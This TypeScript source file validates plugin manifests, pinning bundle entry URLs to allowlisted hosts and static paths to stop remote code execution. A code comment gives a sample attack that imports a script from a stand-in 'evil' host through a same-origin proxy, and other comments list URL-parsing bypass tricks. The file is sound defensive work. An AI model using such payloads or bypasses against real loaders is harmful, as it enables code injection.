/**
 * @file validateManifest.ts
 * @description Validates PluginManifest objects against the required schema and security constraints.
 */

import type { PluginManifest } from "./PluginManifest";

/**
 * Result of a manifest validation operation.
 * Used by the loader to prevent malformed or insecure plugins from entering the runtime.
 */
export interface ValidationResult {
    /** True if the manifest satisfies all structural and security requirements. */
    valid: boolean;
    /** List of human-readable descriptions for each validation failure. */
    errors: string[];
}

const VALID_TYPES = ["data-layer", "extension"] as const;
const VALID_TRUSTS = ["built-in", "verified", "unverified"] as const;

/** Hosts allowed to serve a plugin bundle, matched on the parsed hostname. */
const ALLOWED_ENTRY_HOSTS = ["grond.dev", "worldwideview.dev", "maven-system.dev"];
const ALLOWED_ENTRY_CDNS = ["cdn.jsdelivr.net", "unpkg.com"];
const LOCAL_ENTRY_HOSTS = ["localhost", "127.0.0.1"];

/**
 * A sentinel origin used only to resolve a relative entry the same way a browser
 * would. It is never fetched; only the resulting origin and path are inspected.
 */
const RESOLUTION_BASE = "https://app.invalid/";

/**
 * Same-origin paths a plugin bundle may be served from.
 *
 * Being same-origin is NOT on its own enough to be safe: this app also serves
 * `/api/camera/proxy/*`, which streams a remote body back under the caller's
 * chosen content type. `import("/api/camera/proxy/iframe?url=https://evil/x.js")`
 * is same-origin, so a bare origin check would have handed an attacker a module
 * on this origin. Bundles only ever come from static files under /public, so the
 * relative branch is pinned to those directories.
 */
const ALLOWED_ENTRY_PATH_PREFIXES = ["/plugins/", "/plugins-local/", "/e2e-fixtures/"];

/**
 * Resolves a manifest entry to the exact string that must be imported, or null
 * if it may not be imported at all.
 *
 * This returns the canonical form rather than a boolean on purpose. Every
 * self-inflicted regression in this area came from validating one representation
 * of a value and then using another: the checks passed on the string as written
 * while the browser resolved something else ("//host", "/\\host" - a backslash is
 * a slash for http - and "/\n/host", since tab, LF and CR are stripped from
 * anywhere in the input). Handing the caller the resolved value closes that gap
 * by construction: there is no second parse to disagree with the first.
 *
 * Same-origin entries come back ROOT-ABSOLUTE. The validator resolves against a
 * sentinel base, but the browser resolves an entry against the current chunk URL,
 * so a relative entry would resolve differently in each. A root-absolute path is
 * base-independent, which removes that divergence too.
 */
export function resolveEntryUrl(entry: string): string | null {
    let resolved: URL;
    try {
        resolved = new URL(entry, RESOLUTION_BASE);
    } catch {
        return null;
    }

    const isBundlePath = ALLOWED_ENTRY_PATH_PREFIXES.some(
        (prefix) => resolved.pathname.startsWith(prefix),
    );

    /** Base-independent path; re-checked so it cannot itself read as an authority. */
    const samePath = () => {
        const path = `${resolved.pathname}${resolved.search}${resolved.hash}`;
        return path.startsWith("/") && !path.startsWith("//") ? path : null;
    };

    // Resolved back onto the sentinel: a genuinely same-origin path. Allowed only
    // under a static bundle directory - see ALLOWED_ENTRY_PATH_PREFIXES.
    if (resolved.origin === new URL(RESOLUTION_BASE).origin) {
        return isBundlePath ? samePath() : null;
    }

    if (resolved.protocol === "http:" && LOCAL_ENTRY_HOSTS.includes(resolved.hostname)) {
        // The plugin CLI serves an unpacked bundle from its own dev server on some
        // other localhost port, with arbitrary paths — so this branch exists for
        // development and only for development.
        //
        // In production a localhost entry names the VIEWER's machine, not this
        // app, so it points every member's browser at whatever they happen to be
        // running locally. A self-hosted install serving its own bundles uses a
        // relative entry, which takes the same-origin branch above and is
        // unaffected. Note the host arrives normalised: "http://2130706433/..." is
        // 127.0.0.1, so a decimal or octal form cannot slip past this.
        return process.env.NODE_ENV === "production" ? null : resolved.href;
    }
    if (resolved.protocol !== "https:") return null;

    // Credentials in the authority are never legitimate here and read as an
    // allowlisted host to a human skimming the URL.
    if (resolved.username || resolved.password) return null;

    // Normalise onto the URL itself, not into a local variable. Lowercasing and
    // dropping the root dot only for the comparison, then returning
    // `resolved.href`, would authorise "sub.grond.dev." and hand back a different
    // host than the one that was checked — the same class of gap this function
    // exists to close.
    resolved.hostname = resolved.hostname.toLowerCase().replace(/\.$/, "");
    const host = resolved.hostname;

    if (ALLOWED_ENTRY_CDNS.includes(host)) return resolved.href;
    const allowedHost = ALLOWED_ENTRY_HOSTS.some(
        (allowed) => host === allowed || host.endsWith(`.${allowed}`),
    );
    return allowedHost ? resolved.href : null;
}

/** Boolean form of {@link resolveEntryUrl}, for callers that only gate. */
export function isAllowedEntryUrl(entry: string): boolean {
    return resolveEntryUrl(entry) !== null;
}

/**
 * Validates a plugin manifest for structural integrity and security compliance.
 * This is the primary security gate for the Grond plugin ecosystem.
 * It ensures that all required fields are present and, crucially, enforces
 * an 'Entry URL Allowlist' to prevent Remote Code Execution (RCE) from
 * untrusted domains. All external bundles must originate from approved
 * CDNs or official Grond infrastructure.
 *
 * @param manifest - The manifest object to validate (potentially partial during parsing).
 * @returns A ValidationResult indicating success or a list of identified security/structural risks.
 */
export function validateManifest(
    manifest: Partial<PluginManifest>,
): ValidationResult {
    const errors: string[] = [];

    // Default type for older manifests missing the field to ensure backward compatibility
    if (manifest && !manifest.type) {
        manifest.type = "data-layer";
    }

    if (!manifest.id?.trim()) errors.push("Missing required field: id");
    if (!manifest.name?.trim()) errors.push("Missing required field: name");
    if (!manifest.version?.trim()) errors.push("Missing required field: version");

    if (!VALID_TYPES.includes(manifest.type as typeof VALID_TYPES[number])) {
        errors.push(`Invalid type "${manifest.type}". Must be: ${VALID_TYPES.join(", ")}`);
    }
    if (!VALID_TRUSTS.includes(manifest.trust as typeof VALID_TRUSTS[number])) {
        errors.push(`Invalid trust "${manifest.trust}". Must be: ${VALID_TRUSTS.join(", ")}`);
    }
    if (!Array.isArray(manifest.capabilities) || manifest.capabilities.length === 0) {
        errors.push("capabilities must be a non-empty array");
    }

    // Entry point validation - critical for preventing RCE.
    //
    // Judged on the RAW entry, with no trim(): the loader resolves the raw string,
    // and String.prototype.trim strips characters the URL parser does not (NBSP,
    // BOM, ideographic space). Trimming here meant this function and the loader
    // could reach different verdicts on the same manifest — the same
    // validate-one-form-use-another gap this whole area kept failing on.
    if (!manifest.entry || manifest.entry.trim() === "") {
        errors.push("Missing required field: entry");
    } else if (resolveEntryUrl(manifest.entry) === null) {
        errors.push("entry URL must be a relative path, CDN, localhost, or grond.dev domain");
    }

    // Extension plugins require a target to extend
    if (manifest.type === "extension") {
        if (!Array.isArray(manifest.extends) || manifest.extends.length === 0) {
            errors.push("Extension plugins require a non-empty extends array");
        }
    }

    return { valid: errors.length === 0, errors };
}
